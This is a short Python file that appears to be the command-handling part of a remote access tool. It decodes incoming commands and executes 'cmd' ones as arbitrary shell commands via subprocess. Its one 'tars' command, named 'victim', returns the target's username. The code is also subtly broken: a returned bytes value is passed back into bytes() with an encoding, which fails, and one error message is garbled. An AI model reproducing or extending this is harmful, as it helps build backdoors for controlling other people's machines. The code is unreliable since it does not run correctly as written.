import os
import subprocess

class interpreter:
    def __init__(self):
        self.tars = tars()

    def interprete(self, cmd):
        cmd = cmd.decode("utf8").strip()

        # check if its a cmd or a tars command
        # tars command looks like, tars  command
        # cmd commands looks like, cmd  command
        if len(cmd) < 4: return b"error: not invalid command"
        if cmd[:4] == "tars":
            cmd = self.runtars(cmd[4:].strip())
        elif cmd[:3] == "cmd":
            cmd = self.runcmd(cmd[3:].strip())

        return bytes(cmd, "utf8")

    def runcmd(self, cmd):
        res = subprocess.run(cmd.split(), stdout=subprocess.PIPE)
        print(res.stdout)
        return res.stdout

    def runtars(self, cmd):
        return self.tars.run(cmd)

class tars(object):
    def __init__(self):
        super(tars, self).__init__()
        self.commands = dict(victim=self.victim_)

    def victim_(self, *args):
        return os.environ["USERNAME"]

    def run(self, cmd):
        res = [x.strip() for x in cmd.split()]
        if res[0] in self.commands:
            return self.commands[res[0]](*res[1:])
        else:
            return f"tars command '{res[0]}' is not defined"
